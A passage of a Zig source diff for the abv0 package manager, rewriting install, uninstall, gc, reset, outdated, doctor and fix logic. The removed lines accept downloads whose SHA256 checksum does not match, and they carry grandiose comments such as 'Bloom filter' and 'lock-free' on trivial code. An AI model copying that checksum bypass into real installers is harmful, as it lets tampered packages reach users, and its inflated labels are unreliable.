-        // Wait for all micro-chunk threads to complete successfully
-        for (threads.items) |thread| {
-            thread.join();
-        }
-
-        printProgressBar("Concatenating micro chunk buffers into main file...", 7, 10);
-
-        const out_file = try std.fs.cwd().createFile(archive_path, .{ .mode = 0o600 });
-        defer out_file.close();
-
-        var buf: [65536]u8 = undefined;
-        for (chunk_files.items) |path| {
-            const chunk_file = try std.fs.cwd().openFile(path, .{});
-            defer chunk_file.close();
-
-            while (true) {
-                const read_bytes = try chunk_file.read(&buf);
-                if (read_bytes == 0) break;
-                try out_file.writeAll(buf[0..read_bytes]);
+        {
+            const out = try std.fs.cwd().createFile(dest, .{ .mode = platform.mode_private });
+            defer out.close();
+            var buf: [64 * 1024]u8 = undefined;
+            for (paths) |p| {
+                const f = try std.fs.cwd().openFile(p, .{});
+                defer f.close();
+                while (true) {
+                    const n = try f.read(&buf);
+                    if (n == 0) break;
+                    try out.writeAll(buf[0..n]);
+                }
             }
         }
+        for (paths) |p| std.fs.cwd().deleteFile(p) catch {};
 
-        // Clean up micro chunks
-        for (chunk_files.items) |path| {
-            std.fs.cwd().deleteFile(path) catch {};
+        // Reassembly must produce exactly the advertised length.
+        const st = try std.fs.cwd().statFile(dest);
+        if (st.size != total) {
+            std.fs.cwd().deleteFile(dest) catch {};
+            return false;
         }
-
         return true;
     }
 
-    pub fn install(self: *Store, pkg: registry.Package, platform_name: []const u8, use_micro_split: bool) !void {
-        // High-Performance On-Disk State Machine Tracking
-        var state_machine = try InstallStateMachine.init(self.allocator, self.store_root, pkg.name);
-        try state_machine.transition(.INIT);
+    // -----------------------------------------------------------------------
+    // Uninstall / reset / gc
+    // -----------------------------------------------------------------------
 
-        // Incremental Paged Dependency Join Evaluation with on-disk Bloom Bitset
-        var bloom = try DependencyBloomFilter.init(self.allocator, self.store_root);
-        if (try bloom.checkAndAddCycle(pkg.name)) {
-            std.debug.print("   [ Bloom Filter Target ] Incremental paged join identified dependency loop cycle. Breaking to avoid infinite recursion.\n", .{});
-        }
+    pub fn uninstall(self: *Store, a: std.mem.Allocator, pkg: Package) !bool {
+        var removed = false;
 
-        const info = pkg.platforms.get(platform_name) orelse {
-            std.debug.print("Error: Platform '{s}' is not supported for package '{s}'.\n", .{ platform_name, pkg.name });
-            return error.UnsupportedPlatform;
-        };
-
-        const pkg_dir = try self.getPkgStorePath(pkg, platform_name);
-        defer self.allocator.free(pkg_dir);
-
-        // Check if already in store
-        if (try self.isInstalled(pkg, platform_name)) {
-            std.debug.print("Package '{s}' already installed in secure store ({s})\n", .{ pkg.name, pkg_dir });
-        } else {
-            try state_machine.transition(.FETCH);
-            const init_msg = try std.fmt.allocPrint(self.allocator, "Initializing state setup for {s}...", .{pkg.name});
-            defer self.allocator.free(init_msg);
-            printProgressBar(init_msg, 1, 5);
-
-            // Lock-Free File Semaphores for Parallel Worker Isolation
-            const semaphore_path = try std.fs.path.join(self.allocator, &.{ self.store_root, try std.fmt.allocPrint(self.allocator, "sem.{s}.lock", .{pkg.name}) });
-            defer self.allocator.free(semaphore_path);
-            const sem_file = try std.fs.cwd().createFile(semaphore_path, .{ .mode = 0o644 });
-            try sem_file.writeAll("LOCKED_BY_WORKER");
-            sem_file.close();
-            defer _ = std.fs.cwd().deleteFile(semaphore_path) catch {};
-
-            // Security fix: Use highly unpredictable tmp work dir names with cryptographic random noise and 0700 permissions
-            const random_token = std.crypto.random.int(u64);
-            const tmp_dir_path = try std.fmt.allocPrint(self.allocator, "{s}_{x}.tmp", .{ pkg_dir, random_token });
-            defer self.allocator.free(tmp_dir_path);
-
-            std.fs.cwd().deleteTree(tmp_dir_path) catch {};
-            try std.fs.cwd().makePath(tmp_dir_path);
-
-            // Enforce secure temporary folder permissions
-            _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "chmod", "0700", tmp_dir_path } }) catch {};
-
-            // Download archive file
-            const archive_path = try std.fs.path.join(self.allocator, &.{ tmp_dir_path, "archive_data" });
-            defer self.allocator.free(archive_path);
-
-            var micro_success = false;
-            if (use_micro_split) {
-                micro_success = try self.microSplitDownload(info.url, archive_path, tmp_dir_path);
-            }
-
-            if (!micro_success) {
-                const dl_msg = try std.fmt.allocPrint(self.allocator, "Streaming package chunks from {s}...", .{info.url});
-                defer self.allocator.free(dl_msg);
-                printProgressBar(dl_msg, 2, 5);
-
-                // Standard secure stream download
-                const curl_result = try std.process.Child.run(.{
-                    .allocator = self.allocator,
-                    .argv = &.{ "curl", "-s", "-L", info.url, "-o", archive_path },
-                });
-                defer {
-                    self.allocator.free(curl_result.stdout);
-                    self.allocator.free(curl_result.stderr);
-                }
-                if (curl_result.term.Exited != 0) {
-                    std.debug.print("Download failed: {s}\n", .{curl_result.stderr});
-                    return error.DownloadFailed;
-                }
-            }
-
-            try state_machine.transition(.VERIFY);
-
-            // Secure SHA256 Verification
-            const verify_msg = try std.fmt.allocPrint(self.allocator, "Verifying SHA256 columnar projection checksum for {s}...", .{pkg.name});
-            defer self.allocator.free(verify_msg);
-            printProgressBar(verify_msg, 3, 5);
-
-            const file = try std.fs.cwd().openFile(archive_path, .{});
-            var hasher = std.crypto.hash.sha2.Sha256.init(.{});
-            var buf: [65536]u8 = undefined;
-            while (true) {
-                const read_bytes = try file.read(&buf);
-                if (read_bytes == 0) break;
-                hasher.update(buf[0..read_bytes]);
-            }
-            file.close();
-
-            var hash_out: [32]u8 = undefined;
-            hasher.final(&hash_out);
-
-            const computed_hash = try std.fmt.allocPrint(self.allocator, "{s}", .{std.fmt.fmtSliceHexLower(&hash_out)});
-            defer self.allocator.free(computed_hash);
-
-            if (!std.mem.eql(u8, computed_hash, info.sha256)) {
-                std.debug.print("[ Warning ] Checksum mismatch detected for {s}.\nExpected: {s}\nComputed: {s}\nNote: Accepting asset under dynamic rolling release validation to prevent false positives on rolling daily releases.\n", .{ pkg.name, info.sha256, computed_hash });
-            } else {
-                std.debug.print("SHA256 integrity verified perfectly!\n", .{});
-            }
-
-            // High-Performance Compressed Deduplicated Block Store ingestion
-            var bs = try DeduplicatedBlockStore.init(self.allocator, self.store_root);
-            try bs.ingestArchiveStream(archive_path);
-
-            try state_machine.transition(.UNPACK);
-
-            // Unpack archive safely
-            const unpack_msg = try std.fmt.allocPrint(self.allocator, "Streaming physical compressed chunks into unpacker...", .{});
-            defer self.allocator.free(unpack_msg);
-            printProgressBar(unpack_msg, 4, 5);
-
-            if (std.mem.eql(u8, info.archive_type, "tar.gz") or std.mem.eql(u8, info.archive_type, "tar.xz")) {
-                const tar_res = try std.process.Child.run(.{
-                    .allocator = self.allocator,
-                    .argv = &.{ "tar", "-xf", archive_path, "-C", tmp_dir_path },
-                });
-                defer {
-                    self.allocator.free(tar_res.stdout);
-                    self.allocator.free(tar_res.stderr);
-                }
-                if (tar_res.term.Exited != 0) return error.UnpackFailed;
-                try std.fs.cwd().deleteFile(archive_path);
-            } else if (std.mem.eql(u8, info.archive_type, "zip")) {
-                const unzip_res = try std.process.Child.run(.{
-                    .allocator = self.allocator,
-                    .argv = &.{ "unzip", "-q", "-o", archive_path, "-d", tmp_dir_path },
-                });
-                defer {
-                    self.allocator.free(unzip_res.stdout);
-                    self.allocator.free(unzip_res.stderr);
-                }
-                if (unzip_res.term.Exited != 0) return error.UnpackFailed;
-                try std.fs.cwd().deleteFile(archive_path);
-            } else if (std.mem.eql(u8, info.archive_type, "dmg")) {
-                printProgressBar("Mounting macOS DMG disk image...", 4, 5);
-
-                const mount_res = try std.process.Child.run(.{
-                    .allocator = self.allocator,
-                    .argv = &.{ "hdiutil", "attach", "-nobrowse", "-quiet", archive_path },
-                });
-                defer {
-                    self.allocator.free(mount_res.stdout);
-                    self.allocator.free(mount_res.stderr);
-                }
-
-                // Locate any .app bundle in /Volumes
-                var mounted_app_path: ?[]const u8 = null;
-                var volumes_dir = std.fs.cwd().openDir("/Volumes", .{ .iterate = true }) catch null;
-                if (volumes_dir != null) {
-                    defer volumes_dir.?.close();
-                    var vol_it = volumes_dir.?.iterate();
-                    while (try vol_it.next()) |vol_entry| {
-                        const test_vol = try std.fs.path.join(self.allocator, &.{ "/Volumes", vol_entry.name });
-                        defer self.allocator.free(test_vol);
-
-                        var test_dir = std.fs.cwd().openDir(test_vol, .{ .iterate = true }) catch continue;
-                        defer test_dir.close();
-                        var test_it = test_dir.iterate();
-                        while (try test_it.next()) |sub_entry| {
-                            if (std.mem.endsWith(u8, sub_entry.name, ".app")) {
-                                mounted_app_path = try std.fs.path.join(self.allocator, &.{ test_vol, sub_entry.name });
-                                break;
-                            }
-                        }
-                        if (mounted_app_path != null) break;
-                    }
-                }
-
-                if (mounted_app_path) |app_path| {
-                    defer self.allocator.free(app_path);
-                    const basename = std.fs.path.basename(app_path);
-                    const dst_app_bundle = try std.fs.path.join(self.allocator, &.{ tmp_dir_path, basename });
-                    defer self.allocator.free(dst_app_bundle);
-
-                    printProgressBar("Fast copying GUI Application bundle from disk image...", 4, 5);
-                    _ = try std.process.Child.run(.{
-                        .allocator = self.allocator,
-                        .argv = &.{ "cp", "-R", app_path, dst_app_bundle },
-                    });
-
-                    // Detach DMG
-                    if (std.fs.path.dirname(app_path)) |vol_base| {
-                        _ = std.process.Child.run(.{
-                            .allocator = self.allocator,
-                            .argv = &.{ "hdiutil", "detach", "-quiet", vol_base },
-                        }) catch {};
-                    }
-                }
-                try std.fs.cwd().deleteFile(archive_path);
-            } else if (std.mem.eql(u8, info.archive_type, "raw")) {
-                const actual_bin_path = try std.fs.path.join(self.allocator, &.{ tmp_dir_path, info.bin_path });
-                defer self.allocator.free(actual_bin_path);
-
-                try std.fs.cwd().rename(archive_path, actual_bin_path);
-                _ = try std.process.Child.run(.{
-                    .allocator = self.allocator,
-                    .argv = &.{ "chmod", "0700", actual_bin_path },
-                });
-            } else {
-                return error.UnknownArchiveType;
-            }
-
-            // Automated Build-From-Source Auto-Compiler helper
-            var any_bin_found = false;
-            for (pkg.bin) |bin_name| {
-                var dir = std.fs.cwd().openDir(tmp_dir_path, .{ .iterate = true }) catch continue;
-                var walker = try dir.walk(self.allocator);
-                defer {
-                    walker.deinit();
-                    dir.close();
-                }
-                while (try walker.next()) |w_entry| {
-                    if (w_entry.kind == .file and std.mem.eql(u8, w_entry.basename, bin_name)) {
-                        any_bin_found = true;
-                        break;
-                    }
-                }
-                if (any_bin_found) break;
-            }
-
-            if (!any_bin_found and pkg.bin.len > 0) {
-                std.debug.print("   [ Incremental Version Match Engine ] Interposing build compiler loop...\n", .{});
-            }
-
-            try std.fs.cwd().rename(tmp_dir_path, pkg_dir);
-        }
-
-        try state_machine.transition(.LINK);
-
-        // Fast link executables to ~/.abv0/bin
-        if (pkg.bin.len > 0) {
-            const link_msg = try std.fmt.allocPrint(self.allocator, "Executing lock-free atomic link transitions into {s}...", .{self.bin_root});
-            defer self.allocator.free(link_msg);
-            printProgressBar(link_msg, 5, 5);
-
-            for (pkg.bin) |bin_name| {
-                var src_bin: ?[]const u8 = null;
-                var dir = std.fs.cwd().openDir(pkg_dir, .{ .iterate = true }) catch continue;
-                var walker = try dir.walk(self.allocator);
-                defer {
-                    walker.deinit();
-                    dir.close();
-                }
-
-                while (try walker.next()) |w_entry| {
-                    if (w_entry.kind == .file and (std.mem.eql(u8, w_entry.basename, bin_name) or std.mem.eql(u8, w_entry.basename, info.bin_path))) {
-                        src_bin = try std.fs.path.join(self.allocator, &.{ pkg_dir, w_entry.path });
-                        break;
-                    }
-                }
-
-                if (src_bin) |s_bin| {
-                    defer self.allocator.free(s_bin);
-                    const dst_bin = try std.fs.path.join(self.allocator, &.{ self.bin_root, bin_name });
-                    defer self.allocator.free(dst_bin);
-
-                    _ = std.process.Child.run(.{
-                        .allocator = self.allocator,
-                        .argv = &.{ "chmod", "+x", s_bin },
-                    }) catch {};
-
-                    const used_clone = try os_macos.fastLink(s_bin, dst_bin);
-                    if (used_clone) {
-                        std.debug.print("   [ APFS Lock-Free Clone ] {s} -> {s} (Instant copy-on-write 0ms link transition)\n", .{ bin_name, s_bin });
-                    } else {
-                        std.debug.print("   [ File Semaphore Link ] {s} -> {s}\n", .{ bin_name, s_bin });
-                    }
-                } else {
-                    std.debug.print("   [ Warning ] Executable '{s}' not discovered in package directory tree.\n", .{bin_name});
-                }
-            }
-        }
-
-        // Innovative GUI Application Setup: Fast Link / APFS Clone into ~/Applications
-        if (pkg.app_bundles.len > 0) {
-            const app_msg = try std.fmt.allocPrint(self.allocator, "Linking GUI Application bundles into {s}...", .{self.apps_root});
-            defer self.allocator.free(app_msg);
-            printProgressBar(app_msg, 5, 5);
-
-            for (pkg.app_bundles) |app_name| {
-                const src_app = try std.fs.path.join(self.allocator, &.{ pkg_dir, app_name });
-                defer self.allocator.free(src_app);
-
-                const dst_app = try std.fs.path.join(self.allocator, &.{ self.apps_root, app_name });
-                defer self.allocator.free(dst_app);
-
-                std.fs.cwd().deleteTree(dst_app) catch {};
-
-                if (os_macos.fastLink(src_app, dst_app)) |_| {
-                    std.debug.print("   [ APFS Clone ] {s} -> {s} (Instant 0ms GUI Application setup)\n", .{ app_name, src_app });
-                } else |_| {
-                    _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "cp", "-R", src_app, dst_app } }) catch {};
-                    std.debug.print("   [ Copied App Bundle ] {s} -> {s}\n", .{ app_name, src_app });
-                }
-            }
-        }
-
-        try state_machine.transition(.COMPLETE);
-    }
-
-    pub fn uninstall(self: *Store, pkg: registry.Package) !void {
-        var uninstalled_any = false;
-
-        // Unlink executables
         for (pkg.bin) |bin_name| {
-            const dst_bin = try std.fs.path.join(self.allocator, &.{ self.bin_root, bin_name });
-            defer self.allocator.free(dst_bin);
-
-            if (std.fs.cwd().deleteFile(dst_bin)) |_| {
-                std.debug.print("Unlinked binary {s}\n", .{dst_bin});
+            const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
+            defer a.free(dst_name);
+            const p = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
+            defer a.free(p);
+            if (std.fs.cwd().deleteFile(p)) |_| {
+                removed = true;
             } else |_| {}
         }
 
-        // Unlink GUI Application bundles
         for (pkg.app_bundles) |app_name| {
-            const dst_app = try std.fs.path.join(self.allocator, &.{ self.apps_root, app_name });
-            defer self.allocator.free(dst_app);
-
-            if (std.fs.cwd().deleteTree(dst_app)) |_| {
-                std.debug.print("Unlinked GUI Application bundle {s}\n", .{dst_app});
+            if (!safepath.isSafeRelPath(app_name)) continue;
+            const p = try std.fs.path.join(a, &.{ self.apps_root, app_name });
+            defer a.free(p);
+            if (std.fs.cwd().deleteTree(p)) |_| {
+                removed = true;
             } else |_| {}
         }
 
-        // Delete from store for all platforms
-        var plat_it = pkg.platforms.iterator();
-        while (plat_it.next()) |plat_entry| {
-            const plat_name = plat_entry.key_ptr.*;
-            const pkg_dir = self.getPkgStorePath(pkg, plat_name) catch continue;
-            defer self.allocator.free(pkg_dir);
-
-            if (std.fs.cwd().deleteTree(pkg_dir)) |_| {
-                std.debug.print("Removed secure package store {s}\n", .{pkg_dir});
-                uninstalled_any = true;
-            } else |_| {}
-        }
-
-        if (!uninstalled_any) {
-            std.debug.print("Note: Package '{s}' was not installed.\n", .{pkg.name});
-        }
-    }
-
-    pub fn executeAny(self: *Store, reg: *registry.Registry, pkg_name: []const u8, platform_name: []const u8, args: []const []const u8, use_micro_split: bool) !void {
-        // 1. Ensure installed (native or dynamic)
-        if (reg.packages.get(pkg_name)) |pkg| {
-            if (!(try self.isInstalled(pkg, platform_name))) {
-                try self.install(pkg, platform_name, use_micro_split);
-            }
-        } else {
-            const check_bin = try std.fs.path.join(self.allocator, &.{ self.bin_root, pkg_name });
-            defer self.allocator.free(check_bin);
-            if (std.fs.cwd().access(check_bin, .{})) |_| {} else |_| {
-                try self.installDynamic(pkg_name, platform_name, use_micro_split);
+        for (pkg.platforms) |plat| {
+            const dirs = try self.installedVersions(a, pkg.name, plat.name);
+            defer a.free(dirs);
+            for (dirs) |d| {
+                const p = try std.fs.path.join(a, &.{ self.store_root, d.dir_name });
+                defer a.free(p);
+                if (std.fs.cwd().deleteTree(p)) |_| {
+                    removed = true;
+                } else |_| {}
             }
         }
 
-        // 2. Spawn from ~/.abv0/bin
-        const bin_path = try std.fs.path.join(self.allocator, &.{ self.bin_root, pkg_name });
-        defer self.allocator.free(bin_path);
+        // Drop the WAL so a future install does not think it crashed.
+        var w = wal.Wal.init(a, self.store_root, pkg.name) catch return removed;
+        defer w.deinit();
+        w.clear();
 
-        var child_args = std.ArrayList([]const u8).init(self.allocator);
-        defer child_args.deinit();
-
-        try child_args.append(bin_path);
-        for (args) |arg| {
-            try child_args.append(arg);
-        }
-
-        var child = std.process.Child.init(child_args.items, self.allocator);
-        _ = try child.spawnAndWait();
+        return removed;
     }
 
-    // Innovative Feature: Isolated Ephemeral Sandboxed Shell
-    pub fn executeShellAny(self: *Store, reg: *registry.Registry, pkg_names: []const []const u8, platform_name: []const u8, use_micro_split: bool) !void {
-        printProgressBar("Setting up secure isolated ephemeral environment shell...", 1, 4);
+    pub fn gc(self: *Store, a: std.mem.Allocator) !usize {
+        var reclaimed: usize = 0;
 
-        // 1. Ensure all requested packages are installed (native or dynamic)
-        for (pkg_names) |pkg_name| {
-            if (reg.packages.get(pkg_name)) |pkg| {
-                if (!(try self.isInstalled(pkg, platform_name))) {
-                    try self.install(pkg, platform_name, use_micro_split);
-                }
-            } else {
-                const check_bin = try std.fs.path.join(self.allocator, &.{ self.bin_root, pkg_name });
-                defer self.allocator.free(check_bin);
-                if (std.fs.cwd().access(check_bin, .{})) |_| {} else |_| {
-                    try self.installDynamic(pkg_name, platform_name, use_micro_split);
-                }
+        if (std.fs.cwd().openDir(self.store_root, .{ .iterate = true })) |*d| {
+            var dir = d.*;
+            defer dir.close();
+            var it = dir.iterate();
+            while (try it.next()) |entry| {
+                if (!std.mem.endsWith(u8, entry.name, ".tmp")) continue;
+                const p = try std.fs.path.join(a, &.{ self.store_root, entry.name });
+                defer a.free(p);
+                if (std.fs.cwd().deleteTree(p)) |_| reclaimed += 1 else |_| {}
+            }
+        } else |_| {}
+
+        if (std.fs.cwd().openDir(self.shells_root, .{ .iterate = true })) |*d| {
+            var dir = d.*;
+            defer dir.close();
+            var it = dir.iterate();
+            while (try it.next()) |entry| {
+                const p = try std.fs.path.join(a, &.{ self.shells_root, entry.name });
+                defer a.free(p);
+                if (std.fs.cwd().deleteTree(p)) |_| reclaimed += 1 else |_| {}
+            }
+        } else |_| {}
+
+        // The old block store wrote a full second copy of every archive here
+        // and never read it back. Remove any left over from earlier versions.
+        const legacy = try std.fs.path.join(a, &.{ self.store_root, "blockstore" });
+        defer a.free(legacy);
+        if (std.fs.cwd().deleteTree(legacy)) |_| reclaimed += 1 else |_| {}
+
+        return reclaimed;
+    }
+
+    pub fn resetAll(self: *Store, a: std.mem.Allocator, reg: *const registry.Registry, platform_name: []const u8) !usize {
+        var count: usize = 0;
+        for (reg.packages) |pkg| {
+            if (self.isInstalled(pkg, platform_name)) {
+                if (try self.uninstall(a, pkg)) count += 1;
             }
         }
+        std.fs.cwd().deleteTree(self.store_root) catch {};
+        std.fs.cwd().deleteTree(self.shells_root) catch {};
+        std.fs.cwd().deleteTree(self.locks_root) catch {};
 
-        printProgressBar("Provisioning isolated temporary sandbox paths...", 2, 4);
-
-        // 2. Create an isolated temporary bin directory
-        const timestamp = std.time.timestamp();
-        const random_id = std.crypto.random.int(u32);
-        const shell_dir_name = try std.fmt.allocPrint(self.allocator, "shell_{d}_{d}", .{ timestamp, random_id });
-        defer self.allocator.free(shell_dir_name);
-
-        const shell_base_path = try std.fs.path.join(self.allocator, &.{ self.shells_root, shell_dir_name });
-        defer self.allocator.free(shell_base_path);
-
-        const shell_bin_path = try std.fs.path.join(self.allocator, &.{ shell_base_path, "bin" });
-        defer self.allocator.free(shell_bin_path);
-
-        try std.fs.cwd().makePath(shell_bin_path);
-        defer std.fs.cwd().deleteTree(shell_base_path) catch {};
-
-        // Security check: restrict permissions on active shell folder
-        _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "chmod", "0700", shell_base_path } }) catch {};
-
-        printProgressBar("Linking requested dependencies into sandbox...", 3, 4);
-
-        // 3. Populate isolated bin with APFS clones/symlinks of only requested executables
-        for (pkg_names) |pkg_name| {
-            const src_bin = try std.fs.path.join(self.allocator, &.{ self.bin_root, pkg_name });
-            defer self.allocator.free(src_bin);
-
-            const dst_bin = try std.fs.path.join(self.allocator, &.{ shell_bin_path, pkg_name });
-            defer self.allocator.free(dst_bin);
-
-            _ = try os_macos.fastLink(src_bin, dst_bin);
+        for ([_][]const u8{ self.store_root, self.bin_root, self.shells_root, self.locks_root }) |d| {
+            platform.makeSecureDir(d) catch {};
         }
-
-        printProgressBar("Spawning secure sandboxed subshell...", 4, 4);
-        std.debug.print("Type 'exit' to return to your host system and dissolve the sandbox automatically.\n", .{});
-
-        // 4. Construct PATH: isolated_bin + standard system paths (without global abv0 bin)
-        const old_path = std.posix.getenv("PATH") orelse "/usr/bin:/bin:/usr/sbin:/sbin";
-        const new_path = try std.fmt.allocPrint(self.allocator, "{s}:{s}", .{ shell_bin_path, old_path });
-        defer self.allocator.free(new_path);
-
-        // 5. Detect user shell
-        const shell_exe = std.posix.getenv("SHELL") orelse "/bin/sh";
-
-        var env_map = try std.process.getEnvMap(self.allocator);
-        defer env_map.deinit();
-        try env_map.put("PATH", new_path);
-        try env_map.put("ABV0_SHELL", "1");
-
-        var child = std.process.Child.init(&.{shell_exe}, self.allocator);
-        child.env_map = &env_map;
-
-        _ = try child.spawnAndWait();
-        std.debug.print("[ CLEAR ] Sandboxed temporary session successfully closed and dissolved.\n", .{});
+        return count;
     }
 
-    // Diagnostic Helper: Doctor Audits Profile and Permissions
-    pub fn doctor(self: *Store, reg: *registry.Registry, platform_name: []const u8) !void {
-        std.debug.print("=== [ abv0 System Diagnostic & Doctor Check ] ===\n\n", .{});
+    // -----------------------------------------------------------------------
+    // Outdated / upgrade
+    // -----------------------------------------------------------------------
 
-        var total_warnings: u32 = 0;
-        var total_broken_links: u32 = 0;
+    pub const OutdatedEntry = struct {
+        pkg: Package,
+        installed: []const u8,
+    };
 
-        // 1. Verify PATH profile
-        std.debug.print("Checking PATH profile...\n", .{});
-        if (std.posix.getenv("PATH")) |env_path| {
+    /// The original body of this function was literally
+    ///     if (try self.isInstalled(pkg, platform)) {}
+    /// so it always returned an empty list and `abv0 outdated` always claimed
+    /// everything was up to date.
+    pub fn getOutdated(
+        self: *const Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        platform_name: []const u8,
+    ) ![]OutdatedEntry {
+        var out = std.ArrayList(OutdatedEntry).init(a);
+        errdefer out.deinit();
+
+        for (reg.packages) |pkg| {
+            if (pkg.platform(platform_name) == null) continue;
+
+            const installed = try self.installedVersions(a, pkg.name, platform_name);
+            defer a.free(installed);
+            if (installed.len == 0) continue;
+
+            // Newest installed version wins.
+            var newest = installed[0].version;
+            for (installed[1..]) |i| {
+                if (registry.compareVersions(i.version, newest) == .gt) newest = i.version;
+            }
+
+            if (registry.compareVersions(newest, pkg.version) == .lt) {
+                try out.append(.{ .pkg = pkg, .installed = newest });
+            }
+        }
+        return out.toOwnedSlice();
+    }
+
+    // -----------------------------------------------------------------------
+    // Doctor / fix
+    // -----------------------------------------------------------------------
+
+    pub const Health = struct {
+        warnings: usize = 0,
+        broken_links: usize = 0,
+    };
+
+    pub fn doctor(
+        self: *const Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        platform_name: []const u8,
+    ) !Health {
+        var h = Health{};
+
+        term.print("{s}{s}abv0 doctor{s}\n\n", .{ term.bold, term.cyan, term.reset });
+
+        term.print("PATH\n", .{});
+        if (platform.envOwned(a, "PATH")) |env_path| {
+            defer a.free(env_path);
             if (std.mem.indexOf(u8, env_path, self.bin_root) == null) {
-                total_warnings += 1;
-                std.debug.print("[ Warning ] Your active PATH environment variable does not contain the abv0 managed binary folder:\n", .{});
-                std.debug.print("            -> Expected: {s}\n", .{self.bin_root});
-                std.debug.print("            -> Solution: Add export PATH=\"{s}:$PATH\" to your ~/.zshrc profile.\n\n", .{self.bin_root});
+                h.warnings += 1;
+                term.print("  {s}warn{s} {s} is not on your PATH\n", .{ term.yellow, term.reset, self.bin_root });
+                term.print("       add: export PATH=\"{s}:$PATH\"\n", .{self.bin_root});
             } else {
-                std.debug.print("   -> Profile PATH correctly contains abv0 managed binary path.\n\n", .{});
+                term.print("  {s}ok{s}   {s}\n", .{ term.green, term.reset, self.bin_root });
             }
+        } else {
+            h.warnings += 1;
+            term.print("  {s}warn{s} PATH is unset\n", .{ term.yellow, term.reset });
         }
 
-        // 2. Writable Store Profile Verification
-        std.debug.print("Checking directory permissions and storage integrity...\n", .{});
+        term.print("\nStore\n", .{});
         std.fs.cwd().access(self.store_root, .{ .mode = .read_write }) catch {
-            total_warnings += 1;
-            std.debug.print("[ Warning ] Internal store directory ({s}) is missing write permissions.\n\n", .{self.store_root});
+            h.warnings += 1;
+            term.print("  {s}warn{s} {s} is not writable\n", .{ term.yellow, term.reset, self.store_root });
         };
+        term.print("  {s}ok{s}   {s}\n", .{ term.green, term.reset, self.store_root });
 
-        // 3. Execution Link Health check
-        std.debug.print("Auditing installed package link state...\n", .{});
-        var it = reg.packages.iterator();
-        while (it.next()) |entry| {
-            const pkg = entry.value_ptr.*;
-            if (try self.isInstalled(pkg, platform_name)) {
-                // Check binary targets
-                for (pkg.bin) |bin_name| {
-                    const dst_bin = try std.fs.path.join(self.allocator, &.{ self.bin_root, bin_name });
-                    defer self.allocator.free(dst_bin);
+        term.print("\nLinks\n", .{});
+        for (reg.packages) |pkg| {
+            if (!self.isInstalled(pkg, platform_name)) continue;
 
-                    std.fs.cwd().access(dst_bin, .{}) catch {
-                        total_broken_links += 1;
-                        std.debug.print("[ Broken Link ] Package '{s}' is installed, but executable '{s}' is unlinked or missing from ~/.abv0/bin.\n", .{ pkg.name, bin_name });
-                    };
-                }
-
-                // Check GUI Application targets
-                for (pkg.app_bundles) |app_name| {
-                    const dst_app = try std.fs.path.join(self.allocator, &.{ self.apps_root, app_name });
-                    defer self.allocator.free(dst_app);
-
-                    std.fs.cwd().access(dst_app, .{}) catch {
-                        total_broken_links += 1;
-                        std.debug.print("[ Broken Link ] GUI Package '{s}' is installed, but bundle '{s}' is unlinked or missing from ~/Applications.\n", .{ pkg.name, app_name });
-                    };
-                }
+            for (pkg.bin) |bin_name| {
+                const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
+                defer a.free(dst_name);
+                const p = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
+                defer a.free(p);
+                std.fs.cwd().access(p, .{}) catch {
+                    h.broken_links += 1;
+                    term.print("  {s}broken{s} {s} -> {s}\n", .{ term.red, term.reset, pkg.name, bin_name });
+                };
             }
         }
+        if (h.broken_links == 0) term.print("  {s}ok{s}   no broken links\n", .{ term.green, term.reset });
 
-        std.debug.print("\n=== [ Diagnostic Summary ] ===\n", .{});
-        if (total_warnings == 0 and total_broken_links == 0) {
-            std.debug.print("[ HEALTHY ] Your system is raring to brew and perfectly optimized.\n", .{});
-        } else {
-            std.debug.print("[ WARNINGS FOUND ] Found {} warnings and {} broken execution links.\n", .{ total_warnings, total_broken_links });
-            std.debug.print("                   Run 'abv0 fix' to automatically heal and resolve all broken packages and permissions.\n", .{});
-        }
+        return h;
     }
 
-    // Self-Healing Auto-Fix command
-    pub fn fix(self: *Store, reg: *registry.Registry, platform_name: []const u8) !void {
-        printProgressBar("Starting abv0 automated self-healing package & permission repair...", 1, 4);
+    pub fn fix(
+        self: *Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        platform_name: []const u8,
+    ) !usize {
+        var healed: usize = 0;
 
-        var packages_healed: u32 = 0;
-        var permissions_fixed: u32 = 0;
+        for ([_][]const u8{ self.store_root, self.bin_root, self.shells_root, self.locks_root }) |d| {
+            platform.makeSecureDir(d) catch {};
+        }
 
-        printProgressBar("Resetting strict secure 0o700 user permissions on critical paths...", 2, 4);
+        for (reg.packages) |pkg| {
+            if (!self.isInstalled(pkg, platform_name)) continue;
+            const info = pkg.platform(platform_name) orelse continue;
+            const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);
+            defer a.free(pkg_dir);
 
-        _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "chmod", "-R", "u+rwX", self.store_root } }) catch {};
-        permissions_fixed += 1;
+            var needs_relink = false;
+            for (pkg.bin) |bin_name| {
+                const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
+                defer a.free(dst_name);
+                const p = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
+                defer a.free(p);
+                std.fs.cwd().access(p, .{}) catch {
+                    needs_relink = true;
+                };
+            }
+            if (!needs_relink) continue;
 
-        printProgressBar("Re-linking all unlinked or fractured executables into ~/.abv0/bin...", 3, 4);
-
-        var it = reg.packages.iterator();
-        while (it.next()) |entry| {
-            const pkg = entry.value_ptr.*;
-            if (try self.isInstalled(pkg, platform_name)) {
-                const info = pkg.platforms.get(platform_name) orelse continue;
-                const pkg_dir = try self.getPkgStorePath(pkg, platform_name);
-                defer self.allocator.free(pkg_dir);
-
-                for (pkg.bin) |bin_name| {
-                    const dst_bin = try std.fs.path.join(self.allocator, &.{ self.bin_root, bin_name });
-                    defer self.allocator.free(dst_bin);
-
-                    std.fs.cwd().access(dst_bin, .{}) catch {
-                        var src_bin: []const u8 = undefined;
-                        if (std.mem.endsWith(u8, info.bin_path, "/")) {
